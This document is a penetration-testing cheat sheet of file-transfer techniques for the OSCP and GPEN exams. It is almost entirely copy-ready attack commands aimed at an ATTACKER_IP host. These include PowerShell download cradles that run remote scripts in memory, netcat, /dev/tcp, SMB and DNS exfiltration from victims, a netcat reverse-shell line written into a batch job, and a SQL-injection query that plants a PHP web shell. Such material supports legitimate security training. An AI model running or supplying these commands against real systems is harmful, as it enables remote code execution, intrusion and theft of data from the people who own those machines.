# File Transfer Cheat Sheet (OSCP / GPEN)

This cheat sheet provides **common file transfer techniques used during penetration testing** in **OSCP and GPEN exams**. File transfer is essential for:

```
Uploading exploits
Uploading enumeration tools
Downloading sensitive data
Uploading reverse shells
```

The main challenge is **moving files between attacker and victim machines** despite restrictions.

---

# 1. Python HTTP Server (Most Common)

Start server on attacker machine:

```bash
python3 -m http.server 8000
```

Download from victim:

```bash
wget http://ATTACKER_IP:8000/file
```

Alternative using curl:

```bash
curl http://ATTACKER_IP:8000/file -o file
```

---

# 2. Netcat File Transfer

### Attacker

Send file:

```bash
nc -lvnp 4444 < file
```

### Victim

Receive file:

```bash
nc ATTACKER_IP 4444 > file
```

---

# 3. Netcat Reverse File Transfer

### Victim sends file

Victim:

```bash
nc ATTACKER_IP 4444 < file
```

Attacker:

```bash
nc -lvnp 4444 > file
```

---

# 4. SCP (Secure Copy)

Upload file:

```bash
scp file user@target:/tmp
```

Download file:

```bash
scp user@target:/tmp/file .
```

---

# 5. FTP Transfer

Start FTP server:

```bash
python3 -m pyftpdlib -p 21
```

Victim:

```bash
ftp ATTACKER_IP
```

Commands:

```
put file
get file
```

---

# 6. TFTP Transfer

Start TFTP server:

```bash
sudo atftpd --daemon --port 69 /tmp
```

Victim:

```bash
tftp ATTACKER_IP
get file
```

---

# 7. SMB File Transfer with smbserver.py

## Start SMB Server on Kali

### Create Share Directory

```bash
mkdir ~/share
```

### Start SMB Server

```bash
smbserver.py -smb2support share ~/share
```

### Authenticated SMB Share

```bash
smbserver.py -smb2support -username user -password pass share ~/share
```

### Verbose / Debug Mode

```bash
smbserver.py -debug -smb2support share ~/share
```

### Share Current Directory

```bash
smbserver.py -smb2support share .
```

### Bind to Specific Interface

```bash
smbserver.py -ip 0.0.0.0 -smb2support share ~/share
```

---

## Access SMB Share from Windows

## CMD

### List Share

```cmd
dir \\KALI_IP\share
```

### Authenticate to SMB Share

```cmd
net use \\KALI_IP\share /user:user pass
```

---

## Transfer Files from Windows to Kali

## CMD

### Copy File

```cmd
copy C:\Users\User\Desktop\file.exe \\KALI_IP\share\
```

### Move File

```cmd
move C:\Users\User\Desktop\file.exe \\KALI_IP\share\
```

---

## PowerShell

### Copy File

```powershell
Copy-Item "C:\Users\User\Desktop\file.exe" "\\KALI_IP\share\"
```

### Authenticated Copy

```powershell
net use \\KALI_IP\share /user:user pass
Copy-Item "C:\Users\User\Desktop\file.exe" "\\KALI_IP\share\"
```

---

# Map SMB Share as Drive

## Map Drive

```cmd
net use Z: \\KALI_IP\share
```

## Map Authenticated Drive

```cmd
net use Z: \\KALI_IP\share /user:user pass
```

## Copy File to Mapped Drive

```cmd
copy file.exe Z:\
```

## Disconnect Drive

```cmd
net use Z: /delete
```

---

## Verify Connectivity

## Check SMB Port

```powershell
Test-NetConnection KALI_IP -Port 445
```

## Verify Share Access

```cmd
dir \\KALI_IP\share
```



## Remove SMB Connections

```cmd
net use * /delete
```

---

# 8. PowerShell File Download

Download and run file:

```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/file')"
IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.150:8000/PowerView.ps1')
```

Save file:

```powershell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file','file.exe')"
(New-Object Net.WebClient).DownloadFile('http://10.10.15.150:8000/PowerView.ps1', 'PowerView.ps1')
. .\PowerView.ps1
```

---

# 9. Certutil Download (Windows)

Download file:

```cmd
certutil -urlcache -split -f http://ATTACKER_IP/file file
```

```
echo C:\Log-Management\nc64.exe -e cmd.exe {your_IP} {port} > C:\LogManagement\job.bat
```

---

# 10. Bitsadmin Download

```cmd
bitsadmin /transfer job http://ATTACKER_IP/file file
```

---

# 11. PowerShell Invoke-WebRequest

```powershell
Invoke-WebRequest http://ATTACKER_IP/file -OutFile file
```

---

# 12. PowerShell Download Cradle
The file is NOT saved to disk. It is executed directly in memory.
Execute remote script:

```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')"
```

---

# 13. Base64 File Transfer

Encode file:

```bash
base64 file > encoded.txt
```

Transfer text.

Decode on victim:

```bash
base64 -d encoded.txt > file
```

---

# 14. Python File Transfer

Victim downloads using Python:

```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://ATTACKER_IP/file','file')"
```

---

# 15. Bash File Download

```bash
curl http://ATTACKER_IP/file -o file
```

Or:

```bash
wget http://ATTACKER_IP/file
```

---

# 16. Bash TCP File Transfer

Victim:

```bash
cat file > /dev/tcp/ATTACKER_IP/4444
```

Attacker:

```bash
nc -lvnp 4444 > file
```

---

# 17. Socat File Transfer

Attacker:

```bash
socat - TCP-LISTEN:4444 > file
```

Victim:

```bash
socat - TCP:ATTACKER_IP:4444 < file
```

---

# 18. Upload via Web Shell

If web shell exists:

```
shell.php?cmd=wget http://ATTACKER_IP/file
```

Or:

```
shell.php?cmd=curl http://ATTACKER_IP/file -o file
```

---

# 19. Upload via SQL Injection

Write file to web root:

```
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'
```

---

# 20. Upload via Metasploit

Start handler:

```bash
use exploit/multi/handler
```

Upload payload.

---

# 21. HTTP Upload Server

Use upload server:

```bash
pip install uploadserver
```

Start server:

```bash
python3 -m uploadserver
```

Upload file:

```bash
curl -X POST http://ATTACKER_IP:8000/upload -F 'files=@file'
```

---

# 22. DNS Exfiltration (Advanced)

Send data through DNS queries.

Example:

```
nslookup file.attacker.com
```

---

# 23. Compress Files Before Transfer

Compress:

```bash
tar -czvf data.tar.gz folder
```

Download compressed archive.

---

# 24. Windows File Transfer via SMB

Mount share:

```cmd
net use \\ATTACKER_IP\share
```

Copy file:

```cmd
copy file \\ATTACKER_IP\share
```

---

# 25. Important File Transfer Locations

Upload files to writable locations:

```
/tmp
/var/tmp
/dev/shm
C:\Temp
C:\Users\Public
```

---

# From Windows to Kali
Use pscp - part of putty tools. Run the commond on Kali

```
pscp Administrator@<windows_ip>:C:/Users/Administrator/20260331004726_loot.zip /root
```

---

# 26. Quick File Transfer Workflow

```
1. Start attacker server
2. Use wget/curl or PowerShell
3. Download payload
4. Execute payload
```

---

# 27. Most Reliable Methods

Most common during exams:

```
Python HTTP server
wget
curl
PowerShell WebClient
certutil
SMB share
```

---

# 28. Troubleshooting File Transfer

Check:

```
Firewall blocking port
Network restrictions
Permission issues
```

Test connectivity:

```bash
ping ATTACKER_IP
```

---

# 29. Quick Commands

Attacker server:

```bash
python3 -m http.server 8000
```

Victim download:

```bash
wget http://ATTACKER_IP/file
```

Windows download:

```cmd
certutil -urlcache -split -f http://ATTACKER_IP/file file
```

---

# 30. Final Advice

File transfer is **critical during OSCP and GPEN exams**.

Always remember:

```
If one method fails, try another.
```

Keep multiple techniques ready because **targets may restrict certain tools**.
